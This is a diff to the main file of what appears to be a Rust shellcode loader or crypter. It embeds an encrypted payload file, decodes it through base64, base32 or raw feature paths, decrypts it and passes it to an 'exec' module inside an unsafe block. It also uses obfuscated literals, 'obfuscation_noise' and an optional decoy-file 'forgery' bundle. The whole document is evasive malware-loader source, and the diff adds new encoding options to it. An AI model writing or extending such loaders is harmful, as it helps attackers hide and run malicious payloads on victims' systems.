@@ -14,15 +14,26 @@ use rustcrypt_ct_macros::obf_lit;
 use decrypt::decrypt;
 use exec::exec;
 use std::process;
-use base64::engine::general_purpose::STANDARD;
-use base64::Engine;
-const ENCRYPT_B64: &'static [u8] = include_bytes!("encrypt.bin");
 
+const ENCRYPT_DATA: &'static [u8] = include_bytes!("encrypt.bin");
+
+#[cfg(feature = "base32_decode")]
+#[allow(dead_code)]
+fn base32_decode_payload() -> Option<Vec<u8>> {
+    // Decode base32 from the embedded constant
+    use base32::decode;
+    use base32::Alphabet;
+    let raw = std::str::from_utf8(ENCRYPT_DATA).ok()?;
+    decode(Alphabet::Rfc4648 { padding: true }, raw)
+}
+
+#[cfg(feature = "base64_decode")]
+#[allow(dead_code)]
 fn base64_decode_payload() -> Option<Vec<u8>> {
     // Decode base64 from the embedded constant
-    let raw = std::str::from_utf8(ENCRYPT_B64).ok()?;
-    let decoded = STANDARD.decode(raw.trim()).ok()?;
-    // New format: return decoded bytes (x||c2||hash1||c1) - detailed validation is performed by the executor
+    use base64::engine::general_purpose::STANDARD;
+    use base64::Engine;
+    let decoded = STANDARD.decode(ENCRYPT_DATA).ok()?;
     Some(decoded)
 }
 
@@ -35,12 +46,16 @@ fn main() {
     #[cfg(feature = "with_forgery")]
     forgery::bundle::bundlefile();
 
+
     #[cfg(feature = "base64_decode")]
-    let decrypted_data = match base64_decode_payload() {
-            Some(d) => d,
-            None => process::exit(1),
-    };
-    
+    let decrypted_data = base64_decode_payload().unwrap();
+
+    #[cfg(feature = "base32_decode")]
+    let decrypted_data = base32_decode_payload().unwrap();
+
+    #[cfg(feature = "none_decode")]
+    let decrypted_data = ENCRYPT_DATA.to_vec();
+
     obfuscation_noise();
 
     unsafe {
